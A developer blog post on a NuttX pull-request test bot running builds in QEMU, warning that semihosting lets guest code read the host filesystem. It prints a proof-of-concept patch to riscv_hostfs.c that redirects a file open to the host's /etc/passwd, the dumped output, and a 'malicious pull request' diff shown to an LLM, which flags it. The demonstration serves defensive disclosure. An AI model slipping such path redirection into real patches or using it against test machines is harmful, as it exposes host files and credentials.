# QEMU Test Bot for Pull Requests: Beware of Semihosting Breakout (Apache NuttX RTOS)

📝 _16 Mar 2025_

![Test Bot for NuttX Pull Requests](https://lupyuen.org/images/testbot-flow.jpg)

Last week we saw our new [__Test Bot__](https://lupyuen.org/articles/testbot.html) for NuttX Pull Requests. When we post this __PR Comment__, it will Build and Test the Pull Request on Real Hardware: [__Oz64 SG2000 RISC-V SBC__](https://lupyuen.github.io/articles/sg2000)

```bash
@nuttxpr test oz64:nsh
```

Today we extend our Test Bot to __QEMU Emulators__: [__Arm64 QEMU__](https://lupyuen.github.io/articles/testbot2#testing-arm64-on-qemu) and [__RISC-V QEMU__](https://lupyuen.github.io/articles/testbot2#testing-risc-v-on-qemu)

```bash
## Test this PR on QEMU Arm64:
## VirtIO Network, Block, RNG, Serial
@nuttxpr test qemu-armv8a:netnsh

## Test this PR on QEMU RISC-V:
## 64-bit Kernel Build
@nuttxpr test rv-virt:knsh64
```

_Testing a Pull Request with QEMU: Is it Totally Safe?_

Not quite, beware of [__Semihosting Breakout__](https://lupyuen.github.io/articles/testbot2#semihosting-breakout). Some LLMs might be helpful for flagging the [__Safety Issues__](https://lupyuen.github.io/articles/testbot2#llm-says-nope).

_How about Real Hardware for Arm and ESP32? Can we test our PRs there?_

Yep we might support testing of Pull Requests on Other Hardware: [__Arm32, Arm64 and ESP32__](https://lupyuen.github.io/articles/testbot2#real-hardware-arm-and-esp32). Some Boards might require a [__MicroSD Multiplexer__](https://lupyuen.github.io/articles/testbot2#real-hardware-arm-and-esp32).

TODO: Pic of Arm64 PR

# Testing Arm64 on QEMU

_Testing a Pull Request on Arm64 QEMU: How does it work?_

```bash
@nuttxpr test qemu-armv8a:netnsh
```

The PR Comment above will trigger our [__Test Bot Rust App__](https://lupyuen.org/articles/testbot.html#test-bot-for-pull-requests) to launch a Build + Test for QEMU Arm64: [build-test-arm64.sh](https://github.com/lupyuen/nuttx-build-farm/blob/main/build-test-arm64.sh)

```bash
## Configure NuttX for Arm64 QEMU with VirtIO and Networking
## https://nuttx.apache.org/docs/latest/platforms/arm64/qemu/boards/qemu-armv8a/index.html
tools/configure.sh qemu-armv8a:netnsh

## Build the NuttX Kernel and Apps
make -j

## Run the NuttX Test
expect arm64.exp
```

Which will execute this __Expect Script__: [arm64.exp](https://github.com/lupyuen/nuttx-build-farm/blob/main/arm64.exp)

<span style="font-size:80%">

```bash
## Boot NuttX on Arm64 QEMU:
## Single Core with VirtIO Network, Block, RNG, Serial
qemu-system-aarch64 \
  -cpu cortex-a53 \
  -nographic \
  -machine virt,virtualization=on,gic-version=3 \
  -chardev stdio,id=con,mux=on \
  -serial chardev:con \
  -global virtio-mmio.force-legacy=false \
  -device virtio-serial-device,bus=virtio-mmio-bus.0 \
  -chardev socket,telnet=on,host=127.0.0.1,port=3450,server=on,wait=off,id=foo \
  -device virtconsole,chardev=foo \
  -device virtio-rng-device,bus=virtio-mmio-bus.1 \
  -netdev user,id=u1,hostfwd=tcp:127.0.0.1:10023-10.0.2.15:23,hostfwd=tcp:127.0.0.1:15001-10.0.2.15:5001 \
  -device virtio-net-device,netdev=u1,bus=virtio-mmio-bus.2 \
  -drive file=./mydisk-1gb.img,if=none,format=raw,id=hd \
  -device virtio-blk-device,bus=virtio-mmio-bus.3,drive=hd \
  -mon chardev=con,mode=readline \
  -kernel ./nuttx
```

</span>

And validate the [__OSTest Output__](https://github.com/lupyuen/nuttx-build-farm/blob/main/arm64.exp#L76-L98). [(Explained here)](https://lupyuen.org/articles/testbot.html#control-our-oz64-sbc)

[(See the __Pull Request__)](https://github.com/apache/nuttx/pull/15857#issuecomment-2665533412)

[(See the __Test Log__)](https://gitlab.com/lupyuen/nuttx-build-log/-/snippets/4808026)

TODO: Pic of RISC-V PR

# Testing RISC-V on QEMU

_What about QEMU RISC-V?_

```bash
@nuttxpr test rv-virt:knsh64
```

The PR Comment above will trigger our [__Test Bot Rust App__](https://lupyuen.org/articles/testbot.html#test-bot-for-pull-requests) to launch a Build + Test for QEMU RISC-V: [build-test-knsh64.sh](https://github.com/lupyuen/nuttx-build-farm/blob/main/build-test-knsh64.sh)

```bash
## Configure NuttX for QEMU RISC-V (64-bit Kernel Build)
## https://nuttx.apache.org/docs/latest/platforms/risc-v/qemu-rv/boards/rv-virt/index.html#knsh64
tools/configure.sh rv-virt:knsh64

## Build the NuttX Kernel
make -j

## Build the NuttX Apps
make -j export
pushd ../apps
./tools/mkimport.sh -z -x ../nuttx/nuttx-export-*.tar.gz
make -j import
popd

## Run the NuttX Test
expect qemu-riscv-knsh64.exp
```

Which will execute this __Expect Script__: [qemu-riscv-knsh64.exp](https://github.com/lupyuen/nuttx-riscv64/blob/main/qemu-riscv-knsh64.exp)

```bash
## Boot NuttX on QEMU Emulator for 64-bit RISC-V with OpenSBI
qemu-system-riscv64 \
  -semihosting \
  -M virt,aclint=on \
  -cpu rv64 \
  -kernel nuttx \
  -nographic
```

And validate the [__OSTest Output__](https://github.com/lupyuen/nuttx-riscv64/blob/main/qemu-riscv-knsh64.exp#L62-L84). [(Explained here)](https://lupyuen.org/articles/testbot.html#control-our-oz64-sbc)

[(See the __Pull Request__)](https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2671847491)

[(See the __Test Log__)](https://gitlab.com/lupyuen/nuttx-build-log/-/snippets/4808969)

[(See the __Bot Log__)](https://gist.github.com/lupyuen/1229510efa9c5b773ed0f4fd73e15e91)

_Is there a Test Controller for QEMU?_

Nope Test Bot for QEMU doesn't require a [__Test Controller__](https://lupyuen.org/articles/testbot.html#connect-our-oz64-sbc). We run the QEMU Tests directly on our [__Build & Test Server__](https://lupyuen.org/articles/testbot.html#control-our-oz64-sbc). Which might be unsafe...

> ![Beware of Semihosting, it might break out from the QEMU Sandbox and into our Host Computer](https://lupyuen.org/images/semihost-qemu.jpg)

# Semihosting Breakout

_Testing a Pull Request with QEMU: Should be Totally Safe right?_

Nope __Beware of Semihosting__, it might break out from the QEMU Sandbox and into our Host Computer! Here's why...

```bash
## Let's run this on QEMU RISC-V Kernel Build
## (For rv-virt:knsh64)
nsh> hello
Hello, World!!
```

__For RISC-V Kernel Build__: _hello_ is actually an __ELF Executable__ located at _/system/bin_...

```bash
## Equivalent to this ELF Executable
## (For rv-virt:knsh64)
nsh> /system/bin/hello
Hello, World!!
```

_Where is /system/bin? Don't recall bundling any ELF Executables?_

The ELF Executables exist on Our Computer's __Local Filesystem__... Outside QEMU and the NuttX Filesystem.

![ELF Executables exist on Our Computer's Local Filesystem... Outside QEMU and the NuttX Filesystem](https://lupyuen.org/images/testbot2-apps.png)

This is called [__Semihosting__](https://lupyuen.github.io/articles/semihost#nuttx-calls-semihosting), it gives QEMU direct access to our computer's filesystem. We [__Enabled Semihosting__](https://nuttx.apache.org/docs/latest/platforms/risc-v/qemu-rv/boards/rv-virt/index.html#configurations) when we started QEMU...

```bash
## For NuttX Kernel Build: (rv-virt:knsh64)
## QEMU must run with Semihosting Enabled
qemu-system-riscv64 \
  -semihosting \
  -M virt,aclint=on \
  -cpu rv64 \
  -bios none \
  -kernel nuttx \
  -nographic
```

[(Semihosting is also used by __OpenOCD__ for debugging __Arm32 Devices__)](https://nuttx.apache.org/docs/latest/quickstart/running.html)

_Thus NuttX could break out of QEMU? And access anything in our computer's filesystem?_

Exactly. This is our __"Exploit Code"__ for NuttX Semihosting: [riscv_hostfs.c](https://github.com/lupyuen2/wip-nuttx/blob/sbo/arch/risc-v/src/common/riscv_hostfs.c#L117-L141)

```c
// When NuttX opens a file via Semihosting...
int host_open(const char *pathname, int flags, int mode) {

  // Let's print the pathname
  _info("pathname=%s\n", pathname);

  // If NuttX tries to access the `hello` ELF Executable:
  // Route the access to `/etc/passwd` instead
  const char *pathname2 =
    (strcmp(pathname, "../apps/bin/hello") == 0)
    ? "/etc/passwd"
    : pathname;

  // Rest of the code is unchanged
  // Except `pathname` becomes `pathname2`
  struct {
    const char *pathname;
    long mode;
    size_t len;
  } open = {
    .pathname = pathname2,
    .mode     = host_flags_to_mode(flags),
    .len      = strlen(pathname2),
  };

  // Make a Semihosting Call to QEMU
  // Via the RISC-V EBREAK Instruction
  return host_call(HOST_OPEN, &open, sizeof(open));
}
```

Something seriously sinister happens in NuttX and QEMU... Our "Exploit Code" dumps _/etc/passwd_ from our __Local Computer__!

```bash
## Let's dump the `hello` ELF Executable
nsh> cat /system/bin/hello
host_open: pathname=../apps/bin/cat
host_open: pathname=../apps/bin/hello

## Whoa NuttX dumps `/etc/passwd` from our Local Computer!
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
```

[(See the __Complete Log__)](https://gist.github.com/lupyuen/a1c06b6cbf08feedee4d711b21561705#file-gistfile1-txt-L1238-L1246)

Hence it's __Not Safe__ to test somebody's Pull Request on our computer. Unless we inpect the PR Code very carefully.

[(__Arm32 + OpenOCD__ might be prone to Semihosting Exploit)](https://lupyuen.org/articles/testbot.html#securing-our-bot)

# LLM Says Nope!

_Bummer. Will LLM tell us if the Pull Request is Safe for Testing Locally?_

Let's find out. We crafted a __"Malicious Pull Request"__ with our "Exploit Code"...

- [__"Pull Request that might be Safe or Unsafe"__](https://github.com/lupyuen2/wip-nuttx/pull/89)

We append __`.diff`__ to the Pull Request URL...

```bash
github.com/lupyuen2/wip-nuttx/pull/89.diff
```

To produce a barebones [__Diff Patch__](https://patch-diff.githubusercontent.com/raw/lupyuen2/wip-nuttx/pull/89.diff) for our "Malicious Pull Request"...

![Diff Patch for our "Malicious Pull Request"](https://lupyuen.org/images/testbot2-diff.png)

And we feed the Diff Patch to __Any LLM__...

<span style="font-size:80%">

> _Here is a Pull Request for Apache NuttX RTOS that I will check out to my computer and test on QEMU RISC-V 64-bit Kernel Mode. Is it safe to build and test this Pull Request on my computer?_

```text
diff --git a/arch/risc-v/src/common/riscv_hostfs.c b/arch/risc-v/src/common/riscv_hostfs.c
index aa1409d6a05b0..db54f11ae7623 100644
--- a/arch/risc-v/src/common/riscv_hostfs.c
+++ b/arch/risc-v/src/common/riscv_hostfs.c
@@ -33,6 +33,7 @@
 #include <string.h>
 #include <syscall.h>
 #include <unistd.h>
+#include <debug.h>
 
 /****************************************************************************
  * Pre-processor Definitions
@@ -115,6 +116,11 @@ static int host_flags_to_mode(int flags)
 
 int host_open(const char *pathname, int flags, int mode)
 {
+  _info("pathname=%s\n", pathname);
+  const char *pathname2 =
+    (strcmp(pathname, "../apps/bin/hello") == 0)
+    ? "/etc/passwd"
+    : pathname;
   struct
   {
     const char *pathname;
@@ -122,9 +128,9 @@ int host_open(const char *pathname, int flags, int mode)
     size_t len;
   } open =
   {
-    .pathname = pathname,
+    .pathname = pathname2,
     .mode = host_flags_to_mode(flags),
-    .len = strlen(pathname),
+    .len = strlen(pathname2),
   };
 
 #ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE
```

</span>

[(See the __LLM Prompt__)](https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900)

The LLM we tested _(Gemini Pro 2.0 Experimental)_ says...

<span style="font-size:80%">

> This pull request is **absolutely not safe** to build and test as-is, and it contains a very obvious and serious security vulnerability ...

1.  **Pathname Redirection:**  The code checks if the requested `pathname` is `"../apps/bin/hello"`.  If it is, it *replaces* the requested path with `"/etc/passwd"`.  This is a deliberate, hardcoded attempt to read the host system's password file.  `/etc/passwd` on a typical Linux/Unix system contains user account information. While it doesn't contain hashed passwords anymore (those are usually in `/etc/shadow`), it's still sensitive information that should not be exposed.

2.  **Semihosting Abuse:** This code is within the `host_open` function, which is part of NuttX's semihosting implementation (`CONFIG_RISCV_SEMIHOSTING_HOSTFS`).  Semihosting is a mechanism that allows embedded systems (like those running on NuttX in QEMU) to use the I/O facilities of the host machine (your computer) during debugging.  This code exploits semihosting to access arbitrary files on your *host* operating system.  Essentially, the embedded code is making a system call *on your computer*, not within the isolated QEMU environment.

3.  **No Sanitization:**  Even if the `pathname` is *not* `"../apps/bin/hello"`, there's no sanitization or validation of the requested file path.  An attacker could potentially provide a crafted `pathname` to access *any* file on your host system that the user running QEMU has permission to read (or write, depending on the flags). This could include configuration files, personal documents, or anything else accessible.  It's a classic directory traversal vulnerability.

</span>

[(See the __LLM Response__)](https://gist.github.com/lupyuen/b9fc83a5f496d375b030c93c65271553)

[(Gemini Flash 2.0? It neglected the __Semihosting__)](https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900)

OK Smarty Pants LLM, you foiled our "Malicious Pull Request". Could you possibly stop EVERY Malicious Pull Request? 🤔

TODO: Pic of PinePhone

# Real Hardware: Arm and ESP32

1.  _How about NuttX Arm64: Testing on Real Hardware?_

    Ah this becomes an interesting challenge: Arm64 Devices will boot NuttX on a __MicroSD Card__. Which requires __Human Intervention__ to Flash the MicroSD Card and insert into the Arm64 Device.

    But there's hope for Automated Testing! We ordered a [__MicroSD Multiplexer__](https://www.tindie.com/products/3mdeb/sd-wire-sd-card-reader-sd-card-mux/) that will (electrically) swap a MicroSD between a Test Controller PC and the Arm64 Test Device.
    
    We'll test the MicroSD Multiplexer with [__PinePhone NuttX__](https://lupyuen.github.io/articles/what) real soon.

1.  _Testing on Arm32 Hardware should be easier? STM32, nRF52, RP2040?_

    Yep just modify the [__Build & Test Script__](https://lupyuen.org/articles/testbot.html#build-and-test-script) and [__Expect Script__](https://lupyuen.org/articles/testbot.html#control-our-oz64-sbc) to call [__OpenOCD + ST-Link + Semihosting__](https://nuttx.apache.org/docs/latest/quickstart/running.html). Lemme know if you have questions! 🙏

1.  _And ESP32 Hardware? Xtensa + RISC-V?_

    We're hoping the __Kind Folks at Espressif__ could help to modify the [__Build & Test Script__](https://lupyuen.org/articles/testbot.html#build-and-test-script) and [__Expect Script__](https://lupyuen.org/articles/testbot.html#control-our-oz64-sbc) for our PR Test Bot.
    
    Then we can easily test any NuttX Pull Request on __Real ESP32 Hardware__, Xtensa and RISC-V. 👍

# What's Next

Next week we take a break from Continuous Integration. We'll chat about the (literally) Hot New RISC-V SBC: StarPro64. Stay tuned!

Special Thanks to __Mr Gregory Nutt__ for your guidance and kindness. I'm also grateful to [__My Sponsors__](https://lupyuen.org/articles/sponsor), for supporting my writing. 

- [__Sponsor me a coffee__](https://lupyuen.org/articles/sponsor)

- [__Discuss this article on Hacker News__](TODO)

- [__My Current Project: "Apache NuttX RTOS for Sophgo SG2000"__](https://nuttx-forge.org/lupyuen/nuttx-sg2000)

- [__My Other Project: "NuttX for Ox64 BL808"__](https://nuttx-forge.org/lupyuen/nuttx-ox64)

- [__Older Project: "NuttX for Star64 JH7110"__](https://nuttx-forge.org/lupyuen/nuttx-star64)

- [__Olderer Project: "NuttX for PinePhone"__](https://nuttx-forge.org/lupyuen/pinephone-nuttx)

- [__Check out my articles__](https://lupyuen.org)

- [__RSS Feed__](https://lupyuen.org/rss.xml)

_Got a question, comment or suggestion? Create an Issue or submit a Pull Request here..._

[__lupyuen.org/src/testbot2.md__](https://codeberg.org/lupyuen/lupyuen.org/src/branch/master/src/testbot2.md)
